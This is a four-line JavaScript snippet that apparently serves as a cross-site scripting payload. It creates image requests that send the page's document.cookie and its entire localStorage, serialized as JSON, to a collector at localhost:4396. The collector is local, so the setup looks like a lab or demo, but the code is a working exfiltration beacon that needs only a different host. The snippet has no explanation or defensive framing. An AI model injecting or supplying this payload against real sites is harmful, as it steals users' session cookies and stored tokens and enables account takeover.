const img = new Image()
img.src=`http://localhost:4396/img?c=${document.cookie}`
const img2 = new Image()
img2.src=`http://localhost:4396/img?c=${JSON.stringify(localStorage)}`

